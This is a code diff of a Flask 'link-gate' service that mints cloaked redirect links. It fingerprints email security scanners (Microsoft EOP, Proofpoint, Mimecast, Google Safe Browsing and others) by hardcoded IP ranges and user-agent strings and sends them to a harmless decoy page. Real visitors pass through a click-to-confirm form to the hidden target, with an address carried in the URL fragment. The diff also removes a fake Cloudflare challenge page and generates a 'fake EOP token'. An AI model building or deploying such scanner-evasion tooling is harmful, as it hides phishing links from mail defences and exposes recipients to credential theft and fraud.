@@ -5,7 +5,6 @@ import secrets
 import string
 import base64
 import logging
-import threading
 from ipaddress import ip_address, ip_network
 from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl, quote
 
@@ -33,14 +32,6 @@ KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")
 
 UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")
 RATE_LIMIT_PER_MIN = int(os.environ.get("RATE_LIMIT_PER_MIN", "0"))
-TURNSTILE_SITEKEY = os.environ.get("TURNSTILE_SITEKEY", "0x4AAAAAAADnPIDOXQ8p7gPv")
-
-DYNAMIC_IP_SOURCES = {
-    "microsoft_azure": "https://download.microsoft.com/download/7/1/D/71D86715-5596-4529-9B13-DA13A5DE5B63/ServiceTags_Public.json",
-    "google_cloud": "https://www.gstatic.com/ipranges/goog.json",
-    "cloudflare": "https://api.cloudflare.com/client/v4/ips",
-    "aws": "https://ip-ranges.amazonaws.com/ip-ranges.json",
-}
 
 app = Flask(__name__)
 app.secret_key = SK.encode()
@@ -50,39 +41,41 @@ cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("link-gate")
 
-DYNAMIC_SCANNER_NETS = {name: [] for name in DYNAMIC_IP_SOURCES}
-STATIC_SCANNER_NETS = {name: [] for name in ["proofpoint", "mimecast", "barracuda", "talos", "abnormal", "avanan", "ironscales", "zscaler", "forcepoint"]}
+# ---------------------------------------------------------------------------
+# scanner networks & UAs
+# ---------------------------------------------------------------------------
+EOP = [
+    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
+    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
+    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
+    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
+]
+PROOFPOINT = [
+    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
+    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
+    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
+    ip_network("62.128.218.0/23"),
+    ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20"),
+]
+MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
+BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
+TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
+GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
 
-def fetch_dynamic_ips():
-    while True:
-        try:
-            with httpx.Client(timeout=15.0) as client:
-                try:
-                    r = client.get(DYNAMIC_IP_SOURCES["microsoft_azure"])
-                    data = r.json()
-                    nets = []
-                    for tag in data.get("values", []):
-                        if "Exchange" in tag.get("name", "") or "AzureCloud" in tag.get("name", ""):
-                            for prefix in tag.get("properties", {}).get("addressPrefixes", []):
-                                nets.append(ip_network(prefix))
-                    DYNAMIC_SCANNER_NETS["microsoft_azure"] = nets
-                    log.info(f"Updated Microsoft IPs: {len(nets)}")
-                except Exception as e:
-                    log.error(f"Failed to fetch Microsoft IPs: {e}")
-
-                try:
-                    r = client.get(DYNAMIC_IP_SOURCES["google_cloud"])
-                    data = r.json()
-                    nets = [ip_network(p) for p in data.get("prefixes", []) if "ipv4Prefix" in p for p in [p["ipv4Prefix"]]]
-                    DYNAMIC_SCANNER_NETS["google_cloud"] = nets
-                    log.info(f"Updated Google IPs: {len(nets)}")
-                except Exception as e:
-                    log.error(f"Failed to fetch Google IPs: {e}")
-        except Exception:
-            pass
-        time.sleep(12 * 60 * 60)
-
-threading.Thread(target=fetch_dynamic_ips, daemon=True).start()
+SCANNER_NETS = {
+    "microsoft_eop": EOP,
+    "proofpoint": PROOFPOINT,
+    "mimecast": MIMECAST,
+    "barracuda": BARRACUDA,
+    "cisco_talos": TALOS,
+    "google_safebrowsing": GOOGLE_SAFEBROWSING,
+    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
+    "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
+    "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
+    "cloudflare_email": [ip_network("104.30.0.0/18")],
+    "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
+    "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
+}
 
 SCANNER_UA_TOKENS = (
     "microsoft office", "safelinks", "microsoft preview", "proofpoint",
@@ -107,6 +100,9 @@ SCANNER_UA_TOKENS = (
     "statuscake", "site24x7", "newrelic", "datadog synthetics",
 )
 
+ALLOWLIST_IPS = []
+ALLOWLIST_UA = ()
+
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     if xff:
@@ -116,33 +112,30 @@ def client_ip() -> str:
 def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
     low = ua.lower()
-    for tok in SCANNER_UA_TOKENS:
-        if tok in low:
-            out["scanner"] = True
-            out["source"] = tok
-            out["method"] = "ua"
-            return out
-
+    if any(tok in low for tok in ALLOWLIST_UA):
+        out["source"] = "allowlist_ua"
+        return out
     try:
         a = ip_address(ip)
     except ValueError:
         a = None
-        
     if a is not None:
-        for name, nets in DYNAMIC_SCANNER_NETS.items():
+        if any(a in n for n in ALLOWLIST_IPS):
+            out["source"] = "allowlist_ip"
+            return out
+        for name, nets in SCANNER_NETS.items():
             if any(a in n for n in nets):
                 out["scanner"] = True
                 out["source"] = name
-                out["method"] = "ip_dynamic"
-                return out
-        
-        for name, nets in STATIC_SCANNER_NETS.items():
-            if any(a in n for n in nets):
+                out["method"] = "ip"
+                break
+    if not out["scanner"]:
+        for tok in SCANNER_UA_TOKENS:
+            if tok in low:
                 out["scanner"] = True
-                out["source"] = name
-                out["method"] = "ip_static"
-                return out
-
+                out["source"] = tok
+                out["method"] = "ua"
+                break
     return out
 
 def _valid_http_url(u: str) -> bool:
@@ -159,6 +152,9 @@ def _append_query(base_url: str, extra: dict) -> str:
         urlencode(existing), parts.fragment,
     ))
 
+# ---------------------------------------------------------------------------
+# KV (rate limit only)
+# ---------------------------------------------------------------------------
 async def kv_incr(key: str, ttl: int) -> int:
     if not KV_URL or not KV_TOKEN:
         return 0
@@ -172,7 +168,7 @@ async def kv_incr(key: str, ttl: int) -> int:
             r.raise_for_status()
             return int(r.json().get("result") or 0)
         except Exception as e:
-            log.error(json.dumps({"event": "kv_incr_failed", "err": str(e)}))
+            log.error(json.dumps({"event": "kv_incr_failed", "err": str(e), "key": key[:32]}))
             return 0
 
 async def emit_log(event: dict) -> None:
@@ -191,6 +187,17 @@ def _apply_unified_headers(resp):
     resp.headers["X-Frame-Options"] = "DENY"
     resp.headers["X-Content-Type-Options"] = "nosniff"
     resp.headers["Referrer-Policy"] = "no-referrer"
+    resp.headers["Content-Security-Policy"] = (
+        "default-src 'self'; "
+        "img-src 'self' data: https:; "
+        "style-src 'self' 'unsafe-inline' https:; "
+        "font-src 'self' data: https:; "
+        "script-src 'none'; "
+        "connect-src 'none'; "
+        "form-action *; "
+        "base-uri 'none'; "
+        "frame-ancestors 'none'"
+    )
 
 def _static_page(title: str, text: str, status_code: int):
     html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
@@ -201,145 +208,46 @@ def _static_page(title: str, text: str, status_code: int):
     _apply_unified_headers(resp)
     return resp
 
-LANDING = """<!DOCTYPE html>
-<html lang="en-US">
-    <head>
-        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
-        <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
-
-        <title>Just a moment...</title>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-        <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
-        <meta name="robots" content="noindex,nofollow" />
-        <meta name="viewport" content="width=device-width,initial-scale=1" />
-        <script>
-            var verifyCallback_CF = function (response) {
-                let cfForm = document.querySelector("#cfForm")
-                if (validateElement(cfForm) && response.length > 10) {
-                    cfForm.remove()
-                    window.location.href = "{{ target_url }}" + window.location.hash
-                    return
-                }
-                return switchToSecondCaptcha()
-            }
-            var verifyCallback_hCaptcha = function (response) {
-                let gForm = document.querySelector("#gForm")
-                if (gForm == undefined) { return }
-                if (gForm.style != undefined && gForm.style.visibility != undefined) {
-                    gForm = document.querySelector("#gForm").style.visibility = "hidden"
-                }
-                window.location.href = "{{ target_url }}" + window.location.hash
-            }
-            function validateElement(element) {
-                return element != undefined && element.style != undefined && element.style.visibility != undefined
-            }
-            window.switchToSecondCaptcha = function () {
-                let gForm = document.querySelector("#gForm")
-                if (validateElement(gForm) || gForm.style == "visible") { return }
-                setTimeout(function () {
-                    const cfForm = document.querySelector("#cfForm")
-                    if (validateElement(cfForm) && cfForm.style.visibility != "hidden") {
-                        cfForm.remove()
-                    }
-                    setTimeout(function () {
-                        gForm.style.visibility = "visible"
-                    }, 200)
-                }, 200)
-            }
-            var refreshCallBack = function (response) {
-                setTimeout(function () { window.location.reload() }, 1000)
-            }
-        </script>
-
-        <script>
-            window.onloadTurnstileCallback = function () {
-                turnstile.render("#turnstileCaptcha", {
-                    sitekey: "{{ sitekey }}",
-                    callback: verifyCallback_CF,
-                    "expired-callback": refreshCallBack,
-                })
-            }
-        </script>
-        <script>
-            var incrementLoader = function () {
-                const waitp = document.querySelector("#cf-spinner-please-wait")
-                const gForm = document.querySelector("#gForm")
-                if (validateElement(gForm) && gForm.style.visibility == "hidden") {
-                    waitp.textContent += "."
-                }
-            }
-            setTimeout(() => {
-                let i = 0
-                ticker = setInterval(function () {
-                    i += 1
-                    incrementLoader()
-                    if (i > 3) { clearInterval(ticker); return }
-                }, 1000)
-            }, 500)
-
-            setTimeout(function () {
-                const cfForm = document.querySelector("#cfForm")
-                if (!validateElement(cfForm)) { switchToSecondCaptcha(); return }
-                const gForm = document.querySelector("#gForm")
-                if (!validateElement(gForm)) { return }
-                 if (cfForm.style.visibility == "visible" || gForm.style.visibility != "visible") {
-                    switchToSecondCaptcha()
-                }
-            }, 7000)
-        </script>
-    </head>
-
-    <body class="no-js">
-        <div class="main-wrapper" role="main">
-            <div class="main-content">
-                <h1 class="zone-name-title h1">
-                    <div>
-                        <img class="" src="" style="margin-bottom: -17px" style="visibility: hidden" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
-                        <div id="site-name"></div>
-                    </div>
-                </h1>
-                <span id="challenge-error-text"></span>
-                <noscript>
-                    <div id="challenge-error-title">
-                        <div class="h2">
-                            <div class="icon-wrapper">
-                                <div class="heading-icon warning-icon"></div>
-                            </div>
-                            <span class="icon-wrapper">
-                                <div class="heading-icon warning-icon"></div>
-                            </span>
-                            <span id="challenge-error-text"> Enable JavaScript and cookies to continue </span>
-                        </div>
-                    </div>
-                </noscript>
-                <p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the site connection is secure</p>
-                <form action="?" method="POST" id="gForm" style="visibility: hidden">
-                    <div class="h-captcha" data-sitekey="234adb2f-52ba-4697-82fa-abecbb14b173" data-callback="verifyCallback_hCaptcha"></div>
-                    <br>
-                </form>
-                <form action="?" method="POST" id="cfForm" style="visibility: visible" data-callback="verifyCallback_CF">
-                    <div id="turnstileCaptcha"></div>
-                    <br>
-                </form>
-                <div id="challenge-body-text" class="core-msg spacer">
-                    <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px"></div>
-                    <div style="margin: 10px"></div>
-                </div>
-            </div>
-        </div>
-        <div class="footer" role="contentinfo">
-            <div class="footer-inner">
-                <div class="text-center">
-                    <a rel="noopener noreferrer" href="https://www.microsoft.com?utm_source=challenge&utm_campaign=m" target="_blank"></a>
-                </div>
-            </div>
-        </div>
-    </body>
+LANDING = """<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="no-referrer">
+<title>{{ title }}</title>
+<style>
+  :root { color-scheme: light; }
+  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9;padding:1rem}
+  .card{background:#fff;padding:2rem 2.5rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:440px;width:100%;text-align:center;box-sizing:border-box}
+  h1{font-size:1.25rem;margin:0 0 1rem;color:#111;font-weight:600}
+  p{color:#444;margin:0 0 1.5rem;line-height:1.5;font-size:.95rem}
+  button{background:#0b5fff;color:#fff;border:0;padding:.8rem 1.6rem;border-radius:8px;font-size:1rem;cursor:pointer;width:100%}
+  button:hover{background:#0847c4}
+  .hp-field{position:absolute !important;left:-10000px !important;width:1px !important;height:1px !important;overflow:hidden}
+</style>
+</head>
+<body>
+  <form class="card" method="POST" action="{{ action }}" autocomplete="off">
+    <h1>{{ title }}</h1>
+    <p>{{ body }}</p>
+    <input type="text" name="email_confirm_hp" class="hp-field" autocomplete="off" tabindex="-1" aria-hidden="true">
+    <input type="hidden" name="t" value="{{ token }}">
+    <input type="hidden" name="n" value="{{ nonce }}">
+    {% for k, v in forwarded.items() %}
+    <input type="hidden" name="{{ k }}" value="{{ v }}">
+    {% endfor %}
+    <button type="submit">{{ cta }}</button>
+  </form>
+</body>
 </html>"""
 
+# ---------------------------------------------------------------------------
+# routes
+# ---------------------------------------------------------------------------
 @app.route("/health", methods=["GET"])
 def health():
-    return jsonify({"ok": True, "ts": int(time.time())})
+    return jsonify({"ok": True, "ts": int(time.time()), "mode": "broadcast"})
 
 @app.route("/", methods=["GET"])
 def root():
@@ -366,28 +274,110 @@ async def landing(token: str):
 
     allowed = set(data.get("params", []))
     forwarded = {k: v for k, v in request.args.items() if k in allowed and v}
-    
-    fp = data.get("fragment_param", "")
-    fv = ""
-    if fp and request.args.get(fp):
-        fv = request.args.get(fp)
-        forwarded[fp] = fv
 
-    target = data["target"]
-    if forwarded:
-        target = _append_query(target, forwarded)
-        
-    if fv:
-        base = target.split("#", 1)[0]
-        target = f"{base}#{quote(fv, safe='@.-_')}"
+    fp = data.get("fragment_param", "")
+    if fp and request.args.get(fp):
+        forwarded[fp] = request.args.get(fp)
+
+    nonce_payload = {"t": token, "n": secrets.token_urlsafe(16), "ts": time.time()}
+    nonce_blob = cookie_serializer.dumps(nonce_payload)
 
     html = render_template_string(
         LANDING,
-        target_url=target,
-        sitekey=TURNSTILE_SITEKEY
+        action=f"/submit/{token}",
+        token=token,
+        nonce=nonce_blob,
+        forwarded=forwarded,
+        title=data.get("title", "Confirm your request"),
+        body=data.get("body", "Click the button below to continue."),
+        cta=data.get("cta", "Click here to confirm"),
     )
 
     resp = make_response(html)
+    is_https = (
+        request.headers.get("X-Forwarded-Proto", "http") == "https"
+        or request.is_secure
+    )
+    resp.set_cookie(
+        "gate_session",
+        nonce_blob,
+        max_age=GATE_TTL,
+        httponly=True,
+        secure=is_https,
+        samesite="None",
+        path="/",
+    )
+    _apply_unified_headers(resp)
+    return resp
+
+@app.route("/submit/<token>", methods=["POST"])
+async def execute(token: str):
+    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
+
+    if tag["scanner"]:
+        try:
+            data = serializer.loads(token, max_age=TOKEN_TTL)
+            unwanted = data.get("unwanted_target") or UNWANTED_REDIRECT_URL
+        except (SignatureExpired, BadSignature):
+            unwanted = UNWANTED_REDIRECT_URL
+        if not _valid_http_url(unwanted):
+            unwanted = UNWANTED_REDIRECT_URL
+        await emit_log({"event": "post_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
+        return redirect(unwanted, code=302)
+
+    if request.form.get("email_confirm_hp"):
+        await emit_log({"event": "post_honeypot", "ip": client_ip(), "token": token[:12]})
+        return _static_page("Submission Blocked", "Automated behavior detected.", 400)
+
+    submitted_blob = request.form.get("n", "")
+    if not submitted_blob:
+        return _static_page("Missing Context", "Verification payload missing.", 400)
+
+    try:
+        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
+    except (SignatureExpired, BadSignature):
+        return _static_page("Session Expired", "Verification context expired.", 400)
+
+    is_token_valid = secrets.compare_digest(nonce_data.get("t", ""), token)
+    is_fresh = (time.time() - float(nonce_data.get("ts", 0))) < GATE_TTL
+
+    if not (is_token_valid and is_fresh):
+        await emit_log({"event": "post_mismatch", "ip": client_ip(), "token": token[:12]})
+        return _static_page("Verification Failed", "Verification payload mismatched.", 400)
+
+    if RATE_LIMIT_PER_MIN > 0:
+        n = await kv_incr(f"rl:{client_ip()}:{token[:16]}", 60)
+        if n and n > RATE_LIMIT_PER_MIN:
+            await emit_log({"event": "post_ratelimited", "ip": client_ip(), "token": token[:12], "n": n})
+            return _static_page("Too Many Requests", "Please wait before trying again.", 429)
+
+    try:
+        data = serializer.loads(token, max_age=TOKEN_TTL)
+    except SignatureExpired:
+        return _static_page("Link expired", "This link is no longer valid.", 410)
+    except BadSignature:
+        return _static_page("Invalid link", "This link is not valid.", 404)
+
+    target = data["target"]
+
+    allowed_q = set(data.get("params", []))
+    q_forward = {k: request.form.get(k, "") for k in allowed_q if request.form.get(k)}
+    if q_forward:
+        target = _append_query(target, q_forward)
+
+    fp = data.get("fragment_param", "")
+    fv = ""
+    if fp:
+        fv = request.form.get(fp, "")
+        if fv:
+            base = target.split("#", 1)[0]
+            target = f"{base}#{quote(fv, safe='@.-_')}"
+
+    await emit_log({"event": "post_ok", **tag, "token": token[:12],
+                    "q": q_forward, "fragment": fv})
+
+    resp = make_response(redirect(target, code=303))
+    resp.delete_cookie("gate_session", path="/")
     _apply_unified_headers(resp)
     return resp
 
@@ -420,14 +410,10 @@ def mint():
         abort(404)
 
     body = request.get_json(silent=True) or {}
+
     target = body.get("target")
-    
     if not _valid_http_url(target):
         return jsonify({"error": "target must be an http(s) URL"}), 400
-
-    custom_token = body.get("click_upn")
-    if not custom_token:
-        custom_token = generate_eop_token(target)
 
     unwanted_target = body.get("unwanted_target")
     if unwanted_target and not _valid_http_url(unwanted_target):
@@ -436,7 +422,11 @@ def mint():
     allowed_params = body.get("params") or []
     if not isinstance(allowed_params, list) or not all(isinstance(p, str) for p in allowed_params):
         return jsonify({"error": "params must be a list of strings"}), 400
-    
+    allowed_params = [
+        p for p in allowed_params
+        if 1 <= len(p) <= 64 and all(c.isalnum() or c in "-_.:@" for c in p)
+    ]
+
     fragment_param = body.get("fragment_param", "") or ""
     if fragment_param:
         if not isinstance(fragment_param, str) or not (1 <= len(fragment_param) <= 64):
@@ -447,18 +437,29 @@ def mint():
     tok = serializer.dumps({
         "target": target,
         "unwanted_target": unwanted_target or "",
+        "title": body.get("title", "Confirm your request"),
+        "body": body.get("body", "Click the button below to continue."),
+        "cta": body.get("cta", "Click here to confirm"),
         "params": allowed_params,
         "fragment_param": fragment_param,
     })
     
     base = request.host_url.rstrip("/")
+    
+    # Generate the fake EOP token
+    custom_token = body.get("click_upn")
+    if not custom_token:
+        custom_token = generate_eop_token(target)
+        
     encoded_upn = quote(custom_token, safe='')
     
-    final_url = f"{base}/ls/{tok}?click_upn={encoded_upn}"
-    
     return jsonify({
-        "url": final_url,
+        "url": f"{base}/ls/{tok}?click_upn={encoded_upn}",
         "token": tok,
+        "mode": "broadcast",
+        "params": allowed_params,
+        "fragment_param": fragment_param,
+        "unwanted_target": unwanted_target or UNWANTED_REDIRECT_URL,
         "click_upn": custom_token
     })
 
